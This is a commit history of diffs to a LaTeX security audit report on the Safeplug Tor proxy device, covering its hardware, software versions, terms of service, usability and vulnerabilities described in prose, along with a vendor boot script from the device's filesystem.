 \subfloat[][Web page before using Tor and ad-blocking.]{
-  \includegraphics[width=.4\textwidth]{before}
+  \includegraphics[width=.3\textwidth]{before}
   \label{fig:before}
@@
 \quad
-\subfloat[][Webpage after using Tor and ad-blocking.]{
-  \includegraphics[width=.4\textwidth]{after}
+\subfloat[][Web page after using Tor and ad-blocking.]{
+  \includegraphics[width=.3\textwidth]{after}
   \label{fig:after}
 }
+\caption{Application of Safeplug proxy settings.}
 \end{figure*}
@@
 \begin{figure}
-  \centering
-  \includegraphics[width=0.5\textwidth]{funnygoogle}
+  \begin{center}
+  \includegraphics[width=0.3\textwidth]{funnygoogle}
   \caption{Google's response after trying to log in.}
   \label{fig:funnygoogle}
+	\end{center}
 \end{figure}
@@
 
+\bibitem{archforum} Arch Linux ARM Forums. ``Installation on the Pogoplug Series 4.'' \url{http://archlinuxarm.org/forum/viewtopic.php?f=3&t=2284&start=14&sid=11c74c51b7bab241186a8341ba953095}
+
 \bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.
@@
 
+\bibitem{kernelcve} Security Database. ``Linux Linux Kernel 2.6.13.8 CVE'' \url{http://www.security-database.com/cpe.php?detail=cpe:/o:linux:linux_kernel:2.6.31.8}
+
 \bibitem{techreview} Simonite, Tom.

### 2014-02-20 rootfs/etc/init.d/hbmgr.sh
Random stuff from the file system and whatever was on my computer

@@ -1,0 +1,131 @@
+#!/bin/sh
+
+INSTDIR=/usr/local/cloudengines
+RETVAL=0
+
+start()
+{
+    cd $INSTDIR
+
+    modprobe vfat
+
+    if [ -f $INSTDIR/bin/ufsd.ko ]; then
+        insmod $INSTDIR/bin/ufsd.ko
+    fi
+
+    if [ -f $INSTDIR/bin/rt3070sta.ko ]; then
+        echo -n "Loading rt3070sta.ko:        "
+
+        if insmod $INSTDIR/bin/rt3070sta.ko; then
+            echo "Success"
+        else
+            echo "Failure"
+        fi
+    fi
+
+    echo -n "Loading xce.ko:              "
+    if [ -f $INSTDIR/bin/xce.ko ]; then
+        insmod $INSTDIR/bin/xce.ko
+    else
+        modprobe xce
+    fi
+    if [ $? ]; then
+        echo "Success"
+        if [ ! -e /dev/xce ]; then 
+            mknod /dev/xce c 10 241
+        fi
+    else
+        echo "Failure"
+    fi
+
+    # Make sure watchdog is off...
+    echo "wdog=off" > /dev/xce
+
+    echo -n "Starting hbplug:             "
+    ulimit -n 65536
+    ulimit -c unlimited
+    nohup $INSTDIR/bin/hbwd $INSTDIR/bin/hbplug > /dev/null 2>&1 &
+    echo "Success"
+
+    return $RETVAL
+}
+
+stop() {
+    echo -n "Shutting down hbplug:        "
+    if pidof hbwd > /dev/null; then
+        killall hbwd > /dev/null 2>&1
+        retries=120
+        while pidof hbwd > /dev/null && [ $retries -gt 0 ]; do
+            sleep 1;
+            let retries--
+        done
+        if [ $retries -eq 0 ]; then
+            echo "Failure"
+        else
+            echo "Success"
+        fi
+        killall -9 ffmpeg
+    else
+        echo "Not Running"
+    fi
+
+    if [ -f $INSTDIR/bin/ufsd.ko ]; then
+        rmmod ufsd
+    fi
+
+    if [ -f $INSTDIR/bin/rt3070sta.ko ]; then
+        echo -n "Unloading rt3070sta.ko:      "
+
+        rmmod rt3070sta
+
+        if [ $? ]; then
+            echo "Success"
+        else
+            echo "Failure"
+        fi
+    fi
+
[…]

### 2014-02-20 w2sp/report.tex
added intro/conclusion and new images, table

@@
 % no \IEEEPARstart
-User privacy is becoming increasingly important as more Internet users realize how vulnerable they are to attackers and eavesdroppers.
-This has been exacerbated by the current news about the NSA's surveillance of the Internet~\cite{nsa}.
-Unfortunately, the average Internet user is not aware of how to protect themselves against malicious users.
+
+Privacy on the Internet is becoming increasingly important as more users realize how vulnerable they are to being surveilled and attacked; anonymity has become the goal for many Internet users in order to protect themselves.
+A recent study has shown that people have been the victim of many security-related issues, such as compromised emails/accounts, harrassment, stolen Social Security Number, bank information, and credit card numbers, due to their online visibility~\cite{pew}.
+As the Internet grows and the amount of user information that is collected and/or provided online increases, users will continue to be more vulnerable.
+According to this study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address~\cite{pew}.
+While this study shows that a large percentage of users are taking measures to reduce their visibility online, 59\% reported that they don't believe it is possible to become completely anonymous online~\cite{pew}.
+
+The cloud storage company, Pogoplug, noticed the demand for online anonymity, and in November of 2013 they released the Safeplug.
+This device is a small box that plugs into a user's home router and by routing all traffic through Tor, it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online~\cite{pogo}.
+A device such as this should be audited to confirm or deny the validity of such bold claims.
+We conducted the first public third-party security audit of the Safeplug by analyzing the hardware, software, and network behavior.
+The following are some of our findings:
+
+\begin{itemize}
+\item The presence of both first- and third-party tracking cookies.
+\item A Cross-Site Request Forgery (CSRF) vulnerability that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay on/off, adding/removing whitelisted sites from Tor).
+\item A vulnerability that allows an attacker within the network to modify the Safeplug settings without notifying any other devices on the network of the change.
+\item A higher latency than that of the Tor Browser Bundle.
+\end{itemize}
+
+While we found severe engineering vulnerabilities and a weak market, Pogoplug had good intentions and goals for their device.
 
@@
 \caption{Configuration instructions.}
+\label{fig:instructions}
+\end{center}
+\end{figure*}
+
+\begin{figure*}
+\begin{center}
+\includegraphics[width=.6\textwidth]{safeplug_flowchart}
+\caption{Flowchart.}
 \label{fig:instructions}
@@
 
-%%TODO: A table for platform and browsers available?
+%%TODO: verify these
+\begin{center}
+	\begin{tabular}{|c|c|c|}
+	\hline
+		Platform & Browsers \\ \hline
+		Windows	& Internet Explorer, Firefox \\ \hline
+		OSX & Safari, Firefox \\ \hline
+		iOS	& Safari \\ \hline
+		Android	& Firefox\\ \hline
+	\end{tabular}
+\end{center}
 
@@
   \centering
-  \includegraphics[width=0.7\textwidth]{latency2}
+  \includegraphics[width=0.7\textwidth]{graph2}
   \caption{Latency of web requests.}
@@
 
+\section{Conclusion}
 Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is not the correct method for security and anonymity online.
@@
 
+\bibitem{pew} Pew Research Center.  ``Anonymity, Privacy, and Security Online.'', \url{http://www.pewinternet.org/files/old-media//Files/Reports/2013/PIP_AnonymityOnline_090513.pdf}.
+
+\bibitem{pogo} Pogoplug. ``Pogoplug'', \url{https://pogoplug.com}.
+
 \bibitem{safeplug} Pogoplug. ``Safeplug'', \url{https://pogoplug.com/safeplug}.

### 2014-02-24 w2sp/report.tex
Most of Anna's fixes to first draft of report (see email for other notes)

@@
-%% bare_conf.tex
-%% V1.3
-%% 2007/01/11
-%% by Michael Shell
-%% See:
-%% http://www.michaelshell.org/
-%% for current contact information.
-%%
-%% This is a skeleton file demonstrating the use of IEEEtran.cls
-%% (requires IEEEtran.cls version 1.7 or later) with an IEEE conference paper.
-%%
-%% Support sites:
-%% http://www.michaelshell.org/tex/ieeetran/
-%% http://www.ctan.org/tex-archive/macros/latex/contrib/IEEEtran/
-%% and
-%% http://www.ieee.org/
-
-%%*************************************************************************
-%% Legal Notice:
-%% This code is offered as-is without any warranty either expressed or
-%% implied; without even the implied warranty of MERCHANTABILITY or
-%% FITNESS FOR A PARTICULAR PURPOSE! 
-%% User assumes all risk.
-%% In no event shall IEEE or any contributor to this code be liable for
-%% any damages or losses, including, but not limited to, incidental,
-%% consequential, or any other damages, resulting from the use or misuse
-%% of any information contained here.
-%%
-%% All comments are the opinions of their respective authors and are not
-%% necessarily endorsed by the IEEE.
-%%
-%% This work is distributed under the LaTeX Project Public License (LPPL)
-%% ( http://www.latex-project.org/ ) version 1.3, and may be freely used,
-%% distributed and modified. A copy of the LPPL, version 1.3, is included
-%% in the base LaTeX documentation of all distributions of LaTeX released
-%% 2003/12/01 or later.
-%% Retain all contribution notices and credits.
-%% ** Modified files should be clearly indicated as such, including  **
-%% ** renaming them and changing author support contact information. **
-%%
-%% File list of work: IEEEtran.cls, IEEEtran_HOWTO.pdf, bare_adv.tex,
-%%                    bare_conf.tex, bare_jrnl.tex, bare_jrnl_compsoc.tex
-%%*************************************************************************
-
-% *** Authors should verify (and, if needed, correct) their LaTeX system  ***
-% *** with the testflow diagnostic prior to trusting their LaTeX platform ***
-% *** with production work. IEEE's font choices can trigger bugs that do  ***
-% *** not appear when using other class files.                            ***
-% The testflow support page is at:
-% http://www.michaelshell.org/tex/testflow/
-
-% Note that the a4paper option is mainly intended so that authors in
-% countries using A4 can easily print to A4 and see how their papers will
-% look in print - the typesetting of the document will not typically be
-% affected with changes in paper size (but the bottom and side margins will).
-% Use the testflow package mentioned above to verify correct handling of
-% both paper sizes by the user's LaTeX system.
-%
 % Also note that the "draftcls" or "draftclsnofoot", not "draft", option
@@
 \usepackage{cite}
-%\usepackage{cite}
 % cite.sty was written by Donald Arseneau
@@
 % subfigure.sty has been superceeded by subfig.sty.
-
-%\usepackage[caption=false]{caption}
-%\usepackage[font=footnotesize]{subfig}
-
-%\usepackage[caption=false]{subfig}
 % subfig.sty, also written by Steven Douglas Cochran, is the modern
@@
 
-% *** Do not adjust lengths that control margins, column widths, etc. ***
-% *** Do not use packages that alter fonts (such as pslatex).         ***
-% There should be no need to do such things with IEEEtran.cls V1.6 and later.
-% (Unless specifically asked to do so by the journal or conference you plan
-% to submit to, of course. )
-
 % correct bad hyphenation here
@@
 % can use linebreaks \\ within to get better formatting as desired
-\title{Security Audit of Safeplug}
+\title{Security Audit of Safeplug ``Tor in a Box''}
 
@@
 We examine the hardware, software, and network behavior of the Safeplug device, as well as the user experience in comparison to other forms of web browsing.
-Although the Safeplug appears to use Tor as advertised, lack of user education could easily allow users to be identified in ways that they might not expect.
+Although the Safeplug appears to use Tor as advertised, users may still be identified in ways they may not expect.
 Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
-Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, particularly the Tor Browser Bundle.
+Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, the Tor Browser Bundle.
 \end{abstract}
@@
 % \hfil must be used as a separator to get equal spacing.
-% The subfigure.sty package works much the same way, except \subfigure is
-% used instead of \subfloat.
 %
@@
 
-The cloud storage company, Pogoplug, noticed the demand for online anonymity, and in November of 2013 they released the Safeplug.
+The cloud storage company Pogoplug noticed the demand for online anonymity and in November of 2013 they released the Safeplug.
 This device is a small box that plugs into a user's home router and by routing all traffic through Tor, it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online~\cite{pogo}.
-A device such as this should be audited to confirm or deny the validity of such bold claims.
+The Safeplug also claimed simple setup and an abstraction of any technical detail, as shown by the setup instructions that came with the device shown in Figure~\ref{fig:instructions}.
+A device such as this should be audited to confirm or deny the validity of the bold security claims.
 We conducted the first public third-party security audit of the Safeplug by analyzing the hardware, software, and network behavior.
@@
 \begin{itemize}
-\item The presence of both first- and third-party tracking cookies.
+\item The Safeplug functions as a HTTP proxy inside the browser, which then uses Tor on outgoing traffic (see Figure \ref{fig:flow}).
+\item The presence of both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
 \item A Cross-Site Request Forgery (CSRF) vulnerability that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay on/off, adding/removing whitelisted sites from Tor).
@@
 
-While we found severe engineering vulnerabilities and a weak market, Pogoplug had good intentions and goals for their device.
+Pogoplug made use of good security principles by using auditable open source software on their device, and has a laudable goal of making online security the standard for more users.
+However, even if the engineering vulnerabilities are fixed with proper authentication for modifying Safeplug settings, the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network mean that there is little reason to use the Safeplug over the Tor Browser Bundle.
 
 \begin{figure*}
-\begin{center}
+\centering
 \includegraphics[width=.75\textwidth]{instructions}
-\caption{Configuration instructions.}
+\caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
+Pogoplug highlights the ease of installing the device but does not give a clear indication of how the Safeplug functions.}
 \label{fig:instructions}
-\end{center}
 \end{figure*}
@@
 \begin{figure*}
-\begin{center}
+\centering
 \includegraphics[width=.6\textwidth]{safeplug_flowchart}
-\caption{Flowchart.}
-\label{fig:instructions}
-\end{center}
+\caption{Flowchart demonstrating the actual functionality of the Safeplug as an HTTP proxy between a device's browser and the home network's router.}
+\label{fig:flow}
 \end{figure*}
@@
 Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the internet \cite{wired}.
-Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.
+Pogoplug's marketing pitch centers around the protection of users' IP addresses by using Tor \cite{safeplug,bittech}.
 
@@
 Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
-The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) an integrated circuit, and (H), (I) flash memory.
-
-\begin{figure*}[!b]
+The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) the Marvell 88F6192 integrated controller, and (H), (I) flash memory.
+The Marvell controller is from 2008 and runs ARM~\cite{marvellhw}.
+This is the same controller as version 4 of Pogoplug's cloud storage device - and takedowns of that device available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
+Also of note: the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
+
+\begin{figure*}[tb]
 \centering
@@
 \caption{Safeplug circuit board after the teardown.}
+\label{fig:circuit}
 \end{figure*}
-
-\subsection{Software}
-\label{software}
-We determined the software on the device from analyzing network traffic logs of the activation process and accessing the device via SSH.
 
@@
 The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
-
-{\bf TOS updates.} Pogoplug suggests that users consistently read the TOS becaues they can update or change them at anytime.
-Most Safeplug users will likely not read the TOS once, let alone on a regular basis; therefore, most users will be blind to any changes.
-It is also interesting that these TOS are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the TOS, in the package that the device was shipped in.
-
-{\bf Open source licensing information.}  There is a section that acknowledges the use of many open source components in the Safeplug device; this section includes the statement:
-
-\begin{quotation}
-``You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html. '' \cite{safeplug}
-\end{quotation}
-
-The link included is a dead link and takes the user to a web page with a 404 error.
-This lack of attention to detail or respect for open source licenses does not put Pogoplug in a good light.
-In fact, the Tor-talk mailing list noted this particularly, since Tor is an open source project \cite{tormailinglist}.
-
-{\bf Software updates.} Not only can the TOS be updated at any time, so can the software on the device.
-These udpates will be ``automatically delivered'' to the user, but the user is not notified of these updates~\cite{safeplug}.
-This should raise a red flag for users because they may not know when the software in their device is being changed or what it is changing to.
-While Safeplug makes many claims about providing anonymity, users are simply putting their trust in a different entity, namely Pogoplug.
-
-\subsection{Tor Relay Node Option}
+First, the TOS are not presented to the user in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+Although use of the Safeplug device constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
+However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language in TOS but not a good combination with them not being presented to the user.
+
+Following good security and development practices, the Safeplug makes use of several pieces of Open Source software.
+A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
+The TOS conatins a link to a page that woudl supposedly comply with this requirement  \url{http://pogoplug.com/home-en-developers-open-source.html}\cite{safeplug} but the link is dead and instead the reader sees a 404 error.
+This dead link was noted by some members of the Tor-talk mailing list in November 2013\cite{tormailinglist} and has not been fixed as of Feburary 2014.
+Pogoplug's open source page does exist at \url{https://pogoplug.com/opensource} and includes several pieces of software for the Safeplug: bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
+However, there is no way to find this page from the Terms of Service.
+
+The final area of interest was software updates on the device which will be ``automatically delivered'' to the user, but it is unclear whether there will be any notification~\cite{safeplug}.
+Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof} for more details of this attack).
+This is one of the many reasons why users who truly need security and anonymity should opt for the Tor Browser Bundle rather than adding the Safeplug to their network.
+
+\subsection{Explanation of Tor Configuration Options}
 \label{port9001}
-One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially setup, the default setting is to not use it as a relay node.
-
-One of our concerns is how understandable this setting is to the average Internet user.  The settings page describes Tor in an extremely basic way:
+One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially set up, the default setting is to not use it as a relay node.
+
+The settings page describes Tor in an extremely basic way:
 
@@
 
+The link provided is to an advertisement-filled and not particularly reputable looking website with no clear navigation to get to the necessary instructions.
+
 If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
@@
 \subsection{Software on the Safeplug}
-
+\label{versions}
 \begin{center}
-	\begin{tabular}{|c|c|c|}
+  \begin{tabular}{|l|c|c|}
     \hline
@@
     Privoxy Proxy & 3.0.21 & 2013 \\ \hline
-		Tor Onion Routing		& 0.2.3.25		& 2012 \\ \hline
+    Tor & 0.2.3.25 & 2012 \\ \hline
     Dropbear sshd & v0.52 & 2008 \\ \hline
@@
 and \verb!sp_torexceptions!.
-The first contains all of the important details from the configuration page (whether to use Tor, whether to be a relay, whether to adblock) as well as a hidden option about whether to be an exit relay for the Tor network.
-This is not documented anywhere on the site, so enabling this option would likely require SSH access to discover it, thereby breaking the warranty, but it is interesting that this option is available.
-The version file is likely used for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
+The first contains all of the configuration details: whether to use Tor, whether to adblock, and whether to be a relay or an exit relay.
+The version file is used during the check for updates, and the exceptions file is used by the privoxy configuation to control the whitelist of sites not to connect to via Tor.
 
@@
 \section{Usability}
-Many news articles were published to announce the release of the Safeplug in addition to a lengthy discussion on the Tor-talk mailing list~\cite{tormailinglist}.
-There were many thoughts on the Terms of Service and the option to use the device as a Tor relay node; this inspired us to start our analysis with these items.
+Several aspects of the user experience of the Safeplug affect the usability and security of the device.  The Safeplug advertisements highlighted the ease of setup and activation of the device
 
@@
 The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
-It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
-
-%%TODO: verify these
+The platforms presented include popular desktop and mobile platforms.
+The Tor Project has an Android application, as well as the Tor Browser Bundle for Windows and OSX (and Linux, which is not supported explicitly by Pogoplug's page but is likely to have a browser with similar configuration processes to Firefox).
+However, there is no existing Tor Project application for iOS.
+
 \begin{center}
-	\begin{tabular}{|c|c|c|}
+	\begin{tabular}{|c|c|}
 	\hline
 		Platform & Browsers \\ \hline
-		Windows	& Internet Explorer, Firefox \\ \hline
-		OSX & Safari, Firefox \\ \hline
+		Windows	& Internet Explorer, Chrome, Firefox \\ \hline
+		OSX & Safari, Chrome, Firefox \\ \hline
 		iOS	& Safari \\ \hline
-		Android	& Firefox\\ \hline
+		Android	& Chrome \\ \hline
 	\end{tabular}
@@
 
-After we finished our configuration, we were taken to our settings page.
+After we finished our configuration, we were taken to the Safeplug settings page.
 This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off.
+This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off (and if on, an additional option appeared to allow the device to be an exit node.
 
@@
   \begin{center}
-  \includegraphics[width=.4\textwidth]{settings}
-  \caption{Settings page.}
+  \includegraphics[width=.4\textwidth]{settings_with_exit}
+  \caption{Safeplug settings page.  The last button ``Allow Exit'' only appears if the relay option above has been turned on.}
   \label{fig:settings}
@@
 
-Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
-Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
-
-\begin{figure*}[!b]
+\begin{figure*}[tb]
 \centering
@@
 
+Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
+
 Next, we wanted to see how usable this would be to a normal Internet user.
@@
 While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
-We were also prompted with the page in Figure~\ref{fig:funnygoogle} when we tried to log into our Google account, indicating that Google noticed we were trying to login from different locations.
-
-\begin{figure}
-  \begin{center}
-  \includegraphics[width=0.3\textwidth]{funnygoogle}
-  \caption{Google's response after trying to log in.}
-  \label{fig:funnygoogle}
-	\end{center}
-\end{figure}
+We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from significantly ``unusual'' location.
 
@@
 \subsection{Spoofing the Update Server}
+\label{dnsspoof}
 A more dangerous class of vulnerabilities comes from the fact that the update process happens over insecure TCP rather than any kind of encrypted process.
@@
 
+\bibitem{pogo4} SmallNetBuilder. ``Pogoplug Series 4 Reviewed.'' \url{http://www.smallnetbuilder.com/cloud/cloud-storage/486-pogoplug-series-4-reviewed}
+
 \bibitem{wired} Solon, Olivia.

### 2014-02-25 w2sp/report.tex
more edits

@@
 Although the Safeplug appears to use Tor as advertised, users may still be identified in ways they may not expect.
-Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
+Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to a user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
 Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods, the Tor Browser Bundle.
@@
 
-Privacy on the Internet is becoming increasingly important as more users realize how vulnerable they are to being surveilled and attacked; anonymity has become the goal for many Internet users in order to protect themselves.
-A recent study has shown that people have been the victim of many security-related issues, such as compromised emails/accounts, harrassment, stolen Social Security Number, bank information, and credit card numbers, due to their online visibility~\cite{pew}.
+Privacy on the Internet is becoming increasingly important as more users realize how vulnerable they are to surveillance and attacks; anonymity has become the goal for many Internet users in order to protect themselves.
+A recent study has shown that people have been the victim of many security-related issues, such as compromised emails/accounts, harrassment, stolen Social Security Numbers, bank information, and credit card numbers, due to their online visibility~\cite{pew}.
 As the Internet grows and the amount of user information that is collected and/or provided online increases, users will continue to be more vulnerable.
@@
 \item The presence of both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
-\item A Cross-Site Request Forgery (CSRF) vulnerability that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay on/off, adding/removing whitelisted sites from Tor).
-\item A vulnerability that allows an attacker within the network to modify the Safeplug settings without notifying any other devices on the network of the change.
+\item A Cross-Site Request Forgery (CSRF) vulnerability that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay setting on/off, adding/removing whitelisted sites from Tor).
+\item A vulnerability that allows an attacker within the network to modify the Safeplug settings without notifying any other devices on the network.
 \item A higher latency than that of the Tor Browser Bundle.
@@
 Tor is open-source software developed by the Tor Project~\cite{torproject}.
-Users of Tor are highly recommended to use it as part of the {\bf Tor Browser Bundle (TBB)}, which provides a single installation of a browser and the Tor software package.
+Users of Tor are highly recommended to use it as part of the Tor Browser Bundle, which provides a single installation of a browser and the Tor software package.
 This browser has special settings to prevent deanonymization of the traffic by other means, such as cookies, supercookies, or scripts~\cite{torproject}.
@@
 {\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers a box for home network file sharing without needing to use a third-party storage provider.
-Based on our examination of the box discussed below, we suspect that the Pogoplug box was relabelled as Safeplug and just uses different software to achieve its newly branded purpose.
+Based on our examination of the box discussed below, we suspect that the Pogoplug box was relabelled as Safeplug and simply uses different software to achieve its newly branded purpose.
 
 \section{Design and Operation of Safeplug}
-\subsection{Hardware}
-Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.
-Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
-The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) the Marvell 88F6192 integrated controller, and (H), (I) flash memory.
-The Marvell controller is from 2008 and runs ARM~\cite{marvellhw}.
-This is the same controller as version 4 of Pogoplug's cloud storage device - and takedowns of that device available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
-Also of note: the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
-
-\begin{figure*}[tb]
-\centering
-\subfloat[][Top of the board inside the Safeplug device.]{
-  \includegraphics[width=.3\textwidth]{safeplug_listed_top}
-  \label{fig:top}
-}
-\qquad
-\subfloat[][Bottom of the Board inside the Safeplug device.]{
-  \includegraphics[width=.3\textwidth]{safeplug_hardware_new}
-  \label{fig:bottom}
-}
-\caption{Safeplug circuit board after the teardown.}
-\label{fig:circuit}
-\end{figure*}
 
@@
 don't change the setting to use Safeplug as a relay node).
-Then there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
+In this case, there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
 
@@
 This increases the chances that users will run their Safeplug as a relay node.
+
+\subsection{Hardware}
+Before investigating the software, we took apart one of the two Safeplug devices we purchased in order to see the physical components.
+Figure~\ref{fig:top} shows the top of the board and Figure~\ref{fig:bottom} shows the bottom.
+The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) the Marvell 88F6192 integrated controller, and (H), (I) flash memory.
+The Marvell controller is from 2008 and runs ARM~\cite{marvellhw}.
+This is the same controller as version 4 of Pogoplug's cloud storage device - and takedowns of that device available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
+Also of note: the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
+
+\begin{figure*}[tb]
+\centering
+\subfloat[][Top of the board inside the Safeplug device.]{
+  \includegraphics[width=.3\textwidth]{safeplug_listed_top}
+  \label{fig:top}
+}
+\qquad
+\subfloat[][Bottom of the Board inside the Safeplug device.]{
+  \includegraphics[width=.3\textwidth]{safeplug_hardware_new}
+  \label{fig:bottom}
+}
+\caption{Safeplug circuit board after the teardown.}
+\label{fig:circuit}
+\end{figure*}
 
@@
 The Safeplug runs version 2.6.31.8 of Arch Linux on an ARM architecture, which was produced at the end of 2009 and installed on 23 August 2011.
-Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which seem to produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
+Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
 This is the same version of Linux that runs on Version 4 of PogoPlug's Mobile platform \cite{archforum}.
 
-The software installed by the activation process on the Safeplug (it is not on the box prior to the activation) is in \verb!/opt/xce!
+The software installed by the activation process on the Safeplug is in \verb!/opt/xce!
 and includes lighttpd, privoxy, and tor.
@@
 The current version of lighttpd, which has a number of security fixes, was released on 20 January 2014, after the Safeplug was purchased.
-However, checking for an update from the Safeplug does not lead to any updated software installation, one of many cases of inattention to detail.
+However, checking for an update from the Safeplug does not lead to any updated software installation.
 
@@
 \subsection{Networking}
-The lighttpd, Privoxy and Dropbear software give some indication of the networking services on the device.
+The lighttpd, Privoxy, and Dropbear software give some indication of the networking services on the device.
 We used \texttt{nmap} to scan the ports.
@@
 \section{Usability}
-Several aspects of the user experience of the Safeplug affect the usability and security of the device.  The Safeplug advertisements highlighted the ease of setup and activation of the device
+Several aspects of the user experience of the Safeplug affect the usability and security of the device.  The Safeplug advertisements highlighted the ease of setup and activation of the device.
 
@@
 A user would probably decide not to use Safeplug if they could not read their web pages (if they were not in their native language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
-While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, then they may just get frustrated and stop using Safeplug altogether.
+While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, they may just get frustrated and stop using Safeplug altogether.
 We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from significantly ``unusual'' location.
@@
 \subsection{Cookies}  
-While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ logo in a different tab.
-When we clicked on the Google+ logo, it remember who we are; so we can confirm that we still have first-party cookies.
